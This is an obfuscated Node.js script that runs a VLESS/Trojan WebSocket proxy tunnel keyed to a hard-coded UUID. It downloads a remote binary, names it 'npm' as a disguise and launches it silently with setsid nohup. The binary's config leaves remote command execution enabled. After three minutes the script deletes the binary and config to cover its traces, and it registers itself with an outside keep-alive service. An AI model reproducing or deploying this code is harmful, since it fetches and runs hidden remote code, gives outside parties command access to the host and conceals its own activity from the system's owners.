const _0x3670fd=_0x4a24;(function(_0x283fee,_0x2ff418){const _0x40dff6=_0x4a24,_0x5d9593=_0x283fee();while(!![]){try{const _0x38756d=-parseInt(_0x40dff6(0x14c))/0x1+parseInt(_0x40dff6(0x1a4))/0x2*(parseInt(_0x40dff6(0x1bf))/0x3)+-parseInt(_0x40dff6(0x179))/0x4*(parseInt(_0x40dff6(0x15e))/0x5)+parseInt(_0x40dff6(0x1a9))/0x6*(-parseInt(_0x40dff6(0x175))/0x7)+-parseInt(_0x40dff6(0x181))/0x8+-parseInt(_0x40dff6(0x1b7))/0x9*(parseInt(_0x40dff6(0x191))/0xa)+parseInt(_0x40dff6(0x1a6))/0xb*(parseInt(_0x40dff6(0x1a5))/0xc);if(_0x38756d===_0x2ff418)break;else _0x5d9593['push'](_0x5d9593['shift']());}catch(_0x34d456){_0x5d9593['push'](_0x5d9593['shift']());}}}(_0x2844,0x329f2));const os=require('os'),http=require(_0x3670fd(0x146)),fs=require('fs'),axios=require(_0x3670fd(0x177)),net=require(_0x3670fd(0x19d)),path=require(_0x3670fd(0x190)),crypto=require(_0x3670fd(0x187)),{Buffer}=require(_0x3670fd(0x16a)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x3670fd(0x164),NEZHA_SERVER=process[_0x3670fd(0x195)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3670fd(0x195)][_0x3670fd(0x180)]||'',NEZHA_KEY=process[_0x3670fd(0x195)][_0x3670fd(0x1b8)]||'',DOMAIN=process[_0x3670fd(0x195)][_0x3670fd(0x16f)]||'1234.abc.com',AUTO_ACCESS=process[_0x3670fd(0x195)][_0x3670fd(0x170)]||![],WSPATH=process['env'][_0x3670fd(0x1b5)]||UUID[_0x3670fd(0x16d)](0x0,0x8),SUB_PATH=process[_0x3670fd(0x195)]['SUB_PATH']||_0x3670fd(0x171),NAME=process['env'][_0x3670fd(0x1a7)]||'',PORT=process[_0x3670fd(0x195)][_0x3670fd(0x196)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x39b2cd=_0x3670fd;try{const _0x2aadd0=await axios[_0x39b2cd(0x19a)](_0x39b2cd(0x152)),_0x5438e7=_0x2aadd0[_0x39b2cd(0x1a0)];ISP=(_0x5438e7[_0x39b2cd(0x186)]+'-'+_0x5438e7['asOrganization'])['replace'](/ /g,'_');}catch(_0x59f5d6){ISP=_0x39b2cd(0x1a1);}};GetISP();const httpServer=http[_0x3670fd(0x174)]((_0x48d606,_0x7b204a)=>{const _0xdceb5=_0x3670fd;if(_0x48d606['url']==='/'){const _0x357f79=path[_0xdceb5(0x17f)](__dirname,'index.html');fs[_0xdceb5(0x168)](_0x357f79,_0xdceb5(0x189),(_0x4eb924,_0xbee5f0)=>{const _0x2c36a9=_0xdceb5;if(_0x4eb924){_0x7b204a[_0x2c36a9(0x16b)](0xc8,{'Content-Type':_0x2c36a9(0x157)}),_0x7b204a['end'](_0x2c36a9(0x18f));return;}_0x7b204a[_0x2c36a9(0x16b)](0xc8,{'Content-Type':_0x2c36a9(0x157)}),_0x7b204a['end'](_0xbee5f0);});return;}else{if(_0x48d606[_0xdceb5(0x1a2)]==='/'+SUB_PATH){const _0x11bf2e=NAME?NAME+'-'+ISP:ISP,_0x37af2a=_0xdceb5(0x192)+UUID+_0xdceb5(0x165)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xdceb5(0x18c)+WSPATH+'#'+_0x11bf2e,_0x17f0c1=_0xdceb5(0x1b1)+UUID+_0xdceb5(0x1ae)+DOMAIN+_0xdceb5(0x197)+DOMAIN+_0xdceb5(0x18c)+WSPATH+'#'+_0x11bf2e,_0x489285=_0x37af2a+'\x0a'+_0x17f0c1,_0x1cc54=Buffer[_0xdceb5(0x161)](_0x489285)[_0xdceb5(0x18a)](_0xdceb5(0x185));_0x7b204a[_0xdceb5(0x16b)](0xc8,{'Content-Type':_0xdceb5(0x151)}),_0x7b204a[_0xdceb5(0x18b)](_0x1cc54+'\x0a');}else _0x7b204a[_0xdceb5(0x16b)](0x194,{'Content-Type':'text/plain'}),_0x7b204a[_0xdceb5(0x18b)](_0xdceb5(0x160));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3670fd(0x193)](/-/g,''),DNS_SERVERS=[_0x3670fd(0x15c),'1.1.1.1'];function resolveHost(_0x290ec2){return new Promise((_0x29543b,_0x1538ed)=>{const _0x5a7db5=_0x4a24;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5a7db5(0x178)](_0x290ec2)){_0x29543b(_0x290ec2);return;}let _0x389543=0x0;function _0x2a4f19(){const _0x1c0046=_0x5a7db5;if(_0x389543>=DNS_SERVERS[_0x1c0046(0x163)]){_0x1538ed(new Error(_0x1c0046(0x15d)+_0x290ec2+_0x1c0046(0x1ac)));return;}const _0x59587f=DNS_SERVERS[_0x389543];_0x389543++;const _0x2a0811=_0x1c0046(0x154)+encodeURIComponent(_0x290ec2)+_0x1c0046(0x16e);axios[_0x1c0046(0x19a)](_0x2a0811,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x2d195e=>{const _0x22aeaf=_0x1c0046,_0x344592=_0x2d195e[_0x22aeaf(0x1a0)];if(_0x344592['Status']===0x0&&_0x344592[_0x22aeaf(0x158)]&&_0x344592[_0x22aeaf(0x158)][_0x22aeaf(0x163)]>0x0){const _0x3bc66b=_0x344592[_0x22aeaf(0x158)]['find'](_0x4c700c=>_0x4c700c[_0x22aeaf(0x169)]===0x1);if(_0x3bc66b){_0x29543b(_0x3bc66b[_0x22aeaf(0x1a0)]);return;}}_0x2a4f19();})[_0x1c0046(0x172)](_0x121793=>{_0x2a4f19();});}_0x2a4f19();});}function handleVlessConnection(_0x4e96b7,_0x32f034){const _0x5f0d08=_0x3670fd,[_0x151776]=_0x32f034,_0x478dda=_0x32f034[_0x5f0d08(0x16d)](0x1,0x11);if(!_0x478dda['every']((_0x562827,_0x2f2017)=>_0x562827==parseInt(uuid['substr'](_0x2f2017*0x2,0x2),0x10)))return![];let _0x49bf20=_0x32f034[_0x5f0d08(0x16d)](0x11,0x12)[_0x5f0d08(0x198)]()+0x13;const _0x3085c0=_0x32f034[_0x5f0d08(0x16d)](_0x49bf20,_0x49bf20+=0x2)[_0x5f0d08(0x148)](0x0),_0x460652=_0x32f034['slice'](_0x49bf20,_0x49bf20+=0x1)[_0x5f0d08(0x198)](),_0x2ffb82=_0x460652==0x1?_0x32f034['slice'](_0x49bf20,_0x49bf20+=0x4)[_0x5f0d08(0x17f)]('.'):_0x460652==0x2?new TextDecoder()[_0x5f0d08(0x14d)](_0x32f034[_0x5f0d08(0x16d)](_0x49bf20+0x1,_0x49bf20+=0x1+_0x32f034[_0x5f0d08(0x16d)](_0x49bf20,_0x49bf20+0x1)[_0x5f0d08(0x198)]())):_0x460652==0x3?_0x32f034[_0x5f0d08(0x16d)](_0x49bf20,_0x49bf20+=0x10)[_0x5f0d08(0x1bb)]((_0x2a0260,_0x31b6ce,_0x2df6e8,_0x368cad)=>_0x2df6e8%0x2?_0x2a0260[_0x5f0d08(0x1ba)](_0x368cad[_0x5f0d08(0x16d)](_0x2df6e8-0x1,_0x2df6e8+0x1)):_0x2a0260,[])['map'](_0x53ae84=>_0x53ae84[_0x5f0d08(0x148)](0x0)[_0x5f0d08(0x18a)](0x10))['join'](':'):'';_0x4e96b7['send'](new Uint8Array([_0x151776,0x0]));const _0x5982ad=createWebSocketStream(_0x4e96b7);return resolveHost(_0x2ffb82)['then'](_0x3e24b7=>{const _0x4851a5=_0x5f0d08;net[_0x4851a5(0x1be)]({'host':_0x3e24b7,'port':_0x3085c0},function(){const _0x1c9c62=_0x4851a5;this[_0x1c9c62(0x1ad)](_0x32f034['slice'](_0x49bf20)),_0x5982ad['on'](_0x1c9c62(0x149),()=>{})['pipe'](this)['on'](_0x1c9c62(0x149),()=>{})[_0x1c9c62(0x150)](_0x5982ad);})['on'](_0x4851a5(0x149),()=>{});})[_0x5f0d08(0x172)](_0x4aef0b=>{const _0x45f761=_0x5f0d08;net[_0x45f761(0x1be)]({'host':_0x2ffb82,'port':_0x3085c0},function(){const _0x145d36=_0x45f761;this[_0x145d36(0x1ad)](_0x32f034['slice'](_0x49bf20)),_0x5982ad['on'](_0x145d36(0x149),()=>{})[_0x145d36(0x150)](this)['on'](_0x145d36(0x149),()=>{})[_0x145d36(0x150)](_0x5982ad);})['on'](_0x45f761(0x149),()=>{});}),!![];}function _0x4a24(_0x176c94,_0xf6b1b){_0x176c94=_0x176c94-0x146;const _0x2844a8=_0x2844();let _0x4a2421=_0x2844a8[_0x176c94];return _0x4a2421;}function handleTrojanConnection(_0x35cd59,_0x191bf0){const _0xb00efa=_0x3670fd;try{if(_0x191bf0[_0xb00efa(0x163)]<0x3a)return![];const _0x29019d=_0x191bf0[_0xb00efa(0x16d)](0x0,0x38)[_0xb00efa(0x18a)](),_0x1304a9=[UUID];let _0x20a92c=null;for(const _0x4f7674 of _0x1304a9){const _0x559fb0=crypto[_0xb00efa(0x1bd)]('sha224')[_0xb00efa(0x17a)](_0x4f7674)[_0xb00efa(0x147)](_0xb00efa(0x1b0));if(_0x559fb0===_0x29019d){_0x20a92c=_0x4f7674;break;}}if(!_0x20a92c)return![];let _0x153657=0x38;_0x191bf0[_0x153657]===0xd&&_0x191bf0[_0x153657+0x1]===0xa&&(_0x153657+=0x2);const _0x1f9340=_0x191bf0[_0x153657];if(_0x1f9340!==0x1)return![];_0x153657+=0x1;const _0x55cfff=_0x191bf0[_0x153657];_0x153657+=0x1;let _0x3d3dd8,_0x4ebab7;if(_0x55cfff===0x1)_0x3d3dd8=_0x191bf0[_0xb00efa(0x16d)](_0x153657,_0x153657+0x4)['join']('.'),_0x153657+=0x4;else{if(_0x55cfff===0x3){const _0x15689d=_0x191bf0[_0x153657];_0x153657+=0x1,_0x3d3dd8=_0x191bf0['slice'](_0x153657,_0x153657+_0x15689d)[_0xb00efa(0x18a)](),_0x153657+=_0x15689d;}else{if(_0x55cfff===0x4)_0x3d3dd8=_0x191bf0['slice'](_0x153657,_0x153657+0x10)[_0xb00efa(0x1bb)]((_0x4c967,_0x44c63e,_0xd4fba,_0x5a7e68)=>_0xd4fba%0x2?_0x4c967[_0xb00efa(0x1ba)](_0x5a7e68['slice'](_0xd4fba-0x1,_0xd4fba+0x1)):_0x4c967,[])[_0xb00efa(0x1af)](_0x2e7887=>_0x2e7887[_0xb00efa(0x148)](0x0)[_0xb00efa(0x18a)](0x10))[_0xb00efa(0x17f)](':'),_0x153657+=0x10;else return![];}}_0x4ebab7=_0x191bf0[_0xb00efa(0x148)](_0x153657),_0x153657+=0x2;_0x153657<_0x191bf0[_0xb00efa(0x163)]&&_0x191bf0[_0x153657]===0xd&&_0x191bf0[_0x153657+0x1]===0xa&&(_0x153657+=0x2);const _0x4475d3=createWebSocketStream(_0x35cd59);return resolveHost(_0x3d3dd8)['then'](_0x1dc078=>{const _0x342c2b=_0xb00efa;net[_0x342c2b(0x1be)]({'host':_0x1dc078,'port':_0x4ebab7},function(){const _0x597f15=_0x342c2b;_0x153657<_0x191bf0[_0x597f15(0x163)]&&this['write'](_0x191bf0['slice'](_0x153657)),_0x4475d3['on']('error',()=>{})[_0x597f15(0x150)](this)['on'](_0x597f15(0x149),()=>{})[_0x597f15(0x150)](_0x4475d3);})['on'](_0x342c2b(0x149),()=>{});})[_0xb00efa(0x172)](_0x28094d=>{const _0x478d8c=_0xb00efa;net[_0x478d8c(0x1be)]({'host':_0x3d3dd8,'port':_0x4ebab7},function(){const _0x23b7be=_0x478d8c;_0x153657<_0x191bf0['length']&&this[_0x23b7be(0x1ad)](_0x191bf0['slice'](_0x153657)),_0x4475d3['on'](_0x23b7be(0x149),()=>{})[_0x23b7be(0x150)](this)['on']('error',()=>{})[_0x23b7be(0x150)](_0x4475d3);})['on'](_0x478d8c(0x149),()=>{});}),!![];}catch(_0x5262d2){return![];}}wss['on']('connection',(_0x5bf3d8,_0x338a51)=>{const _0xbb3993=_0x3670fd,_0xb4b64d=_0x338a51[_0xbb3993(0x1a2)]||'';_0x5bf3d8['once']('message',_0x1df5ae=>{const _0x2eaf39=_0xbb3993;if(_0x1df5ae['length']>0x11&&_0x1df5ae[0x0]===0x0){const _0xad431d=_0x1df5ae[_0x2eaf39(0x16d)](0x1,0x11),_0x41a90a=_0xad431d[_0x2eaf39(0x14a)]((_0x3e0866,_0x27c41f)=>_0x3e0866==parseInt(uuid[_0x2eaf39(0x14e)](_0x27c41f*0x2,0x2),0x10));if(_0x41a90a){!handleVlessConnection(_0x5bf3d8,_0x1df5ae)&&_0x5bf3d8[_0x2eaf39(0x155)]();return;}}!handleTrojanConnection(_0x5bf3d8,_0x1df5ae)&&_0x5bf3d8[_0x2eaf39(0x155)]();})['on'](_0xbb3993(0x149),()=>{});});function _0x2844(){const _0xcc3d42=['toString','end','&path=%2F','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','443','Hello\x20world!','path','102330tUPFEa','vless://','replace','createWriteStream','env','PORT','&fp=chrome&type=ws&host=','readUInt8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','get','2083','8443','net','aarch64','https://arm64.ssss.nyc.mn/agent','data','Unknown','url','error:\x20','197026mcuodj','16284912DzoXeI','11AFvRNl','NAME','https://arm64.ssss.nyc.mn/v1','126OxfMBW','false','includes','\x20with\x20all\x20DNS\x20servers','write','@cdns.doon.eu.org:443?security=tls&sni=','map','hex','trojan://','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf-8','WSPATH','arch','288SlRWRP','NEZHA_KEY','unlink','concat','reduce','finish','createHash','connect','6rjeSrZ','config.yaml','http','digest','readUInt16BE','error','every','trim','398955mJRotZ','decode','substr','\x20-p\x20','pipe','text/plain','https://speed.cloudflare.com/meta','npm\x20running\x20error:','https://dns.google/resolve?name=','close','split','text/html','Answer','npm\x20is\x20running','/bin/bash','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8.8.4.4','Failed\x20to\x20resolve\x20','5FQKuAx','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Not\x20Found\x0a','from','stream','length','fcef3e7c-3a00-42f3-addb-86760d69c983','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','--tls','npm','readFile','type','buffer','writeHead','Server\x20is\x20running\x20on\x20port\x20','slice','&type=A','DOMAIN','AUTO_ACCESS','sub','catch','https://amd64.ssss.nyc.mn/v1','createServer','33747VYCUAD','npm\x20is\x20already\x20running,\x20skip\x20running...','axios','test','1162012pXRtmp','update','2096','chmod\x20+x\x20npm','https://oooo.serv00.net/add-url','arm','join','NEZHA_PORT','1828808Rdbzqm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2053','pop','base64','country','crypto','true','utf8'];_0x2844=function(){return _0xcc3d42;};return _0x2844();}const getDownloadUrl=()=>{const _0x25649d=_0x3670fd,_0x4b8067=os[_0x25649d(0x1b6)]();return _0x4b8067===_0x25649d(0x17e)||_0x4b8067==='arm64'||_0x4b8067===_0x25649d(0x19e)?!NEZHA_PORT?_0x25649d(0x1a8):_0x25649d(0x19f):!NEZHA_PORT?_0x25649d(0x173):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x58b421=_0x3670fd;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x554e34=getDownloadUrl(),_0x365cde=await axios({'method':_0x58b421(0x19a),'url':_0x554e34,'responseType':_0x58b421(0x162)}),_0x22e025=fs[_0x58b421(0x194)](_0x58b421(0x167));return _0x365cde[_0x58b421(0x1a0)][_0x58b421(0x150)](_0x22e025),new Promise((_0x7a4e7a,_0x4db9a2)=>{const _0x3398f4=_0x58b421;_0x22e025['on'](_0x3398f4(0x1bc),()=>{const _0xe50d02=_0x3398f4;console[_0xe50d02(0x1b2)]('npm\x20download\x20successfully'),exec(_0xe50d02(0x17c),_0x520f50=>{if(_0x520f50)_0x4db9a2(_0x520f50);_0x7a4e7a();});}),_0x22e025['on'](_0x3398f4(0x149),_0x4db9a2);});}catch(_0x545818){throw _0x545818;}},runnz=async()=>{const _0x516f8a=_0x3670fd;try{const _0xf9b572=execSync(_0x516f8a(0x15f),{'encoding':_0x516f8a(0x1b4)});if(_0xf9b572[_0x516f8a(0x14b)]()!==''){console[_0x516f8a(0x1b2)](_0x516f8a(0x176));return;}}catch(_0x2dfed5){}await downloadFile();let _0xbc4f19='',_0x381332=[_0x516f8a(0x18e),_0x516f8a(0x19c),_0x516f8a(0x17b),'2087',_0x516f8a(0x19b),_0x516f8a(0x183)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x33ddeb=_0x381332[_0x516f8a(0x1ab)](NEZHA_PORT)?_0x516f8a(0x166):'';_0xbc4f19='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x516f8a(0x14f)+NEZHA_KEY+'\x20'+_0x33ddeb+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1da14a=NEZHA_SERVER[_0x516f8a(0x1ab)](':')?NEZHA_SERVER[_0x516f8a(0x156)](':')[_0x516f8a(0x184)]():'',_0x21f088=_0x381332[_0x516f8a(0x1ab)](_0x1da14a)?_0x516f8a(0x188):_0x516f8a(0x1aa),_0x10407c='client_secret:\x20'+NEZHA_KEY+_0x516f8a(0x18d)+NEZHA_SERVER+_0x516f8a(0x182)+_0x21f088+_0x516f8a(0x1b3)+UUID;fs['writeFileSync'](_0x516f8a(0x1c0),_0x10407c);}_0xbc4f19=_0x516f8a(0x199);}else{console[_0x516f8a(0x1b2)](_0x516f8a(0x15b));return;}}try{exec(_0xbc4f19,{'shell':_0x516f8a(0x15a)},_0x49bfbf=>{const _0x13c165=_0x516f8a;if(_0x49bfbf)console['error'](_0x13c165(0x153),_0x49bfbf);else console[_0x13c165(0x1b2)](_0x13c165(0x159));});}catch(_0x457e89){console[_0x516f8a(0x149)](_0x516f8a(0x1a3)+_0x457e89);}};async function addAccessTask(){const _0x36b32e=_0x3670fd;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5e0182='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x21f9fb=await axios['post'](_0x36b32e(0x17d),{'url':_0x5e0182},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x55aff0){}}const delFiles=()=>{const _0x2eaff1=_0x3670fd;fs[_0x2eaff1(0x1b9)](_0x2eaff1(0x167),()=>{}),fs['unlink'](_0x2eaff1(0x1c0),()=>{});};httpServer['listen'](PORT,()=>{const _0xe51a88=_0x3670fd;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xe51a88(0x1b2)](_0xe51a88(0x16c)+PORT);});
